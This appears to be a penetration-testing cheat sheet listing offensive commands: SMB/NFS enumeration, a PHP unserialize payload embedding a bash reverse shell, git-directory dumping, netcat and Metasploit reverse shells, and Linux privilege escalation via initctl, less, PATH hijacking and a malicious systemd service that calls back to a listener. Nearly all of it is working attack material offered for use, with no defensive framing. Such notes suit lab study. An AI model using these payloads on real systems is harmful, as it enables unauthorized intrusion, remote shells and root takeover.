# CyberCheatSheets
Reference Sheets / Notes of techniques learned

## Enumeration:
+ <b>Samba - Shares & Users</b>
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.0.1
```

+ <b>NFS - Mounts</b>
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 192.168.0.1
```

## Web Apps:
+ <b>Check for vhost routing, modify /etc/hosts</b>
+ <b>.php files may have .bak (backup)</b>
+ <b>RCE via PHP Unserialize</b>
```
https://notsosecure.com/remote-code-execution-via-php-unserialize/
+ serialize as necessary as a parameter
public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/192.168.0.1/4242 0>&1\'"); ?>';
```
+ <b>Check for exposed /.git directory</b>
Clone repository:
```
wget --mirror -I .git TARGET.COM/.git/ 
```

Get files from last commit:
```
git checkout -- .
```

Check out commit log:
```
git log
```

Check out previous commit:
```
git checkout 123456789
```

## Reverse Shells:

+ <b>Netcat - Listener</b>
```
$nc -nvlp 4242
```

+ <b>Netcat - Connecting to Listener</b>
```
nc -e /bin/sh 192.168.0.1 4242
```

+ <b>Netcat - Connecting to Listener without `-e`</b>
```
$mknod /tmp/backpipe p
$/bin/sh 0</tmp/backpipe | nc <attacker_ip> 4242 1>/tmp/backpipe
```
+ <b>Metasploit - Listener</b>
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/shell/reverse_tcp
OR
set PAYLOAD linux/x86/shell/reverse_tcp
set LHOST 192.168.0.1
set LPORT 4242
run
```

## Upgrading/Stablizing Shells:

+ <b>Shell To Meterpreter</b>
```
(After shell has been backgrounded in Metasploit)
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
OR
sessions -u 1
```

+ <b>Using Python</b>

*Upgrading:*
```
python -c ‘import pty;pty.spawn(“/bin/bash”)’
$export TERM=xterm
```

*Stablizing:*
```
$^Z
$stty raw -echo; fg
(ENTER)
```
## Post-Meterpreter Shell To-Do's:
+ <b>Background Meterpreter Session</b>
```
^Z
Y
```
+ <b>Use Local Exploit Suggester</b>
```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### Windows Target:
+ <b>Get System Info (from meterpreter session)</b>
```
sysinfo
```

+ <b>Get System Info (standard shell) *look for hotfixes*</b>
```
systeminfo
```

## Enumeration:
+ <b>LinPEAS</b>
```
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
```


## Privilege Escalation:

+ <b>/sbin/initctl</b>
```
Check current status of services
udo -u root /sbin/initctl list
```
```
Add this to test.conf
script
    chmod +s /bin/bash
end script
```
```
sudo /sbin/initctl start test.conf
$/bin/bash -p
#whoami
```

+ <b>less</b>
```
less [file in path user is allowed to execute less as root with]
!/bin/sh
```

+ <b>Add '.' to $PATH</b>
```
PATH=.:${PATH}
```

+ <b>Check for processes running as root</b>
```
ps -aux | grep root
```

+ <b>Check for world writable files</b>

```
find / -perm -2 -type f 2>/dev/null
```


+ <b>`/bin/systemctl` SUID</b>

*Check if `/bin/systemcl` is exploitable*
```
find / -perm -u=s -type f 2>/dev/null
```
or
```
find / -perm -4000 2>/dev/null
```

*Write service file with printf (will be written to `/tmp/root.service`)*
```
printf '[Unit]\nDescription=root\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.0.1/4242 0>&1"\n\n[Install]\nWantedBy=multi-user.target\n' > /tmp/root.service
```

*Enable and start the service*
```
systemctl enable /tmp/root.service
systemctl start root
```
